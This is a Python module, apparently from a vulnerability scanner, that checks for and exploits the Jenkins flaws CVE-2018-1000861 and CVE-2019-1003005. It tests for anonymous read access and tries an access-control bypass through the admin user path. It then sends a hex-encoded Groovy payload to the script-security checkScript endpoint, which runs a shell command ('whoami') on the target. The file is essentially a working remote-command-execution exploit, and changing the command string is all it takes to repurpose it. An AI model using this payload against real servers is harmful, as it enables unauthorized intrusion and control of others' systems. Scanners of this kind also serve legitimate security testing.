#!/usr/bin/env python3

'''
name: CVE-2018-1000861漏洞
description: CVE-2018-1000861漏洞可执行任意命令
'''

import re
import binascii
from app.lib.utils.request import request


class CVE_2018_1000861_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.ACL_PATCHED = 0
        self.NOT_JENKINS = 1
        self.READ_ENABLE = 2
        self.READ_BYPASS = 3
        self.ENTRY_NOTFOUND = 999
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
        }

    def check(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        flag, accessible = self.ACL_PATCHED, False
        try:
            # check ANONYMOUS_READ
            anonymous_read_req = request.get(self.url, headers = self.headers)
            if anonymous_read_req.status_code == 200 and 'adjuncts' in anonymous_read_req.text:
                flag, accessible = self.READ_ENABLE, True
                print('ANONYMOUS_READ enable!')
            elif anonymous_read_req.status_code == 403:
                print('ANONYMOUS_READ disable!')
                # check ACL bypass, CVE-2018-1000861
                check_acl_bypass_req = request.get(self.url + '/securityRealm/user/admin', headers = self.headers)
                if check_acl_bypass_req.status_code == 200 and 'adjuncts' in check_acl_bypass_req.text:
                    flag, accessible = self.READ_BYPASS, True
            else:
                flag = self.NOT_JENKINS

            # check entry point, CVE-2019-1003005
            if accessible:
                if flag is self.READ_BYPASS:
                    url = self.url + '/securityRealm/user/admin'
                else:
                    url = self.url
                check_entry_req = request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', headers = self.headers)
                if check_entry_req.status_code == 404:
                    flag = self.ENTRY_NOTFOUND

        except Exception as e:
            print(e)
        finally:
            pass
        return flag

    def exploit(self):
        payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % binascii.hexlify('whoami'.encode('utf-8')).decode(encoding='utf-8')
        params = {
            'sandbox': True,
            'value': payload
        }
        try:
            cmd_req = request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', params = params, headers = self.headers)
            if cmd_req.status_code == 200:
                return True
            elif cmd_req.status_code == 405:
                return False
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

    def run(self):
        flag = self.check()
        if flag is self.ACL_PATCHED:
            print('不存在CVE-2018-1000861漏洞')
            return False
        elif flag is self.NOT_JENKINS:
            print('不存在CVE-2018-1000861漏洞')
            return False
        elif flag is self.READ_ENABLE:
            if self.exploit():
                print('存在CVE-2018-1000861漏洞')
                return True
            else:
                print('不存在CVE-2018-1000861漏洞')
                return False
        elif flag is self.READ_BYPASS:
            print('Bypass with CVE-2018-1000861!')
            self.url = self.url + '/securityRealm/user/admin'
            if self.exploit():
                print('存在CVE-2018-1000861漏洞')
                return True
            else:
                print('不存在CVE-2018-1000861漏洞')
                return False
        else:
            print('不存在CVE-2018-1000861漏洞')
            return False

if __name__ == '__main__':
    CVE_2018_1000861 = CVE_2018_1000861_BaseVerify('http://10.4.69.55:8789')
    CVE_2018_1000861.run()